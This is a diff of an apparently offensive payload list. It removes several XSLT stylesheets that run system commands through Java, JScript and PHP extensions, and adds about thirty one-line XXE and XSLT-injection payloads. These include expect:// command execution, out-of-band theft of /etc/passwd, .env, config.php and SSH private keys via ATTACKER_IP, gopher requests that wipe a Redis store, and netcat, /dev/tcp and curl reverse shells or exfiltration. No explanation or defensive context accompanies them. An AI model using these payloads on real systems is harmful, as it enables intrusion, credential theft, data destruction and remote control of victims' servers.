@@ -1,47 +1,30 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="2.0"
-  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-  xmlns:java="http://saxon.sf.net/java-type">
-<xsl:template match="/">
-  <xsl:variable name="runtime" select="java:java.lang.Runtime.getRuntime()"/>
-  <xsl:variable name="process" select="java:exec($runtime, 'id')"/>
-  <xsl:variable name="in" select="java:getInputStream($process)"/>
-  <xsl:variable name="out" select="java:java.io.InputStreamReader.new($in)"/>
-  <xsl:variable name="buf" select="java:java.io.BufferedReader.new($out)"/>
-  <xsl:value-of select="java:readLine($buf)"/>
-</xsl:template>
-</xsl:stylesheet>
-
-<?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="1.0"
-  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
-  xmlns:str="http://xml.apache.org/xalan/java/java.lang.String">
-<xsl:template match="/">
-  <xsl:variable name="rt" select="rt:getRuntime()"/>
-  <xsl:variable name="proc" select="rt:exec($rt,'id')"/>
-  <xsl:variable name="is" select="proc:getInputStream($proc)"/>
-  <xsl:variable name="sc" select="str:new($is)"/>
-</xsl:template>
-</xsl:stylesheet>
-
-<?xml version="1.0"?>
-<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
-  xmlns:user="urn:my-scripts" version="1.0">
-<msxsl:script language="JScript" implements-prefix="user">
-  function xml(nodelist) { return(new ActiveXObject("WScript.Shell")).exec("cmd /c whoami").StdOut.ReadAll(); }
-</msxsl:script>
-<xsl:template match="/">
-  <xsl:value-of select="user:xml(.)"/>
-</xsl:template>
-</xsl:stylesheet>
-
-<?xml version="1.0" encoding="UTF-8"?>
-<xsl:stylesheet version="1.0"
-  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
-  xmlns:php="http://php.net/xsl">
-<xsl:template match="/">
-  <xsl:value-of select="php:function('system','id')"/>
-</xsl:template>
-</xsl:stylesheet>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://uname -a">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ls">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://hostname">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://env">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://netstat -an">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ifconfig">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ps aux">]><root>&xxe;</root>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://xml.apache.org/xalan/java"><xsl:template match="/"><xsl:value-of select="java:java.lang.Runtime.exec('id')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://xml.apache.org/xalan/java"><xsl:template match="/"><xsl:value-of select="java:java.lang.Runtime.exec('whoami')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://xml.apache.org/xalan/java"><xsl:template match="/"><xsl:value-of select="java:java.lang.Runtime.exec('cat /etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://xml.apache.org/xalan/java"><xsl:template match="/"><xsl:value-of select="java:java.lang.Runtime.exec(new java.lang.String[]{'/bin/sh','-c','id'})"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://xml.apache.org/xalan/java"><xsl:template match="/"><xsl:variable name="cmd" select="java:java.lang.Runtime.getRuntime().exec('/bin/id')"/><xsl:variable name="is" select="java:java.lang.Process.getInputStream($cmd)"/><xsl:variable name="sc" select="java:java.util.Scanner.new($is)"/><xsl:variable name="result" select="java:java.util.Scanner.useDelimiter($sc,'\A')"/><xsl:value-of select="java:java.util.Scanner.next($sc)"/></xsl:template></xsl:stylesheet>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">%dtd;]><root>&send;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php"><!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">%dtd;]><root>&send;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/.env"><!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">%dtd;]><root>&send;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/root/.ssh/id_rsa"><!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">%dtd;]><root>&send;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://ATTACKER_IP/?data=%file;">]><root></root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % goodies SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://ATTACKER_IP/evil.dtd">%dtd;]><foo>&all;</foo>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://localhost:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://localhost:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Afoo%0D%0A%243%0D%0Abar%0D%0A">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://ATTACKER_IP/test">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "sftp://ATTACKER_IP:22/test">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ldap://ATTACKER_IP:389/">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "mailto:xxe@ATTACKER_IP">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://nc -e /bin/bash ATTACKER_IP 4444">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://bash -i &gt;& /dev/tcp/ATTACKER_IP/4444 0&gt;&1">]><root>&xxe;</root>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://curl http://ATTACKER_IP/$(id|base64)">]><root>&xxe;</root>
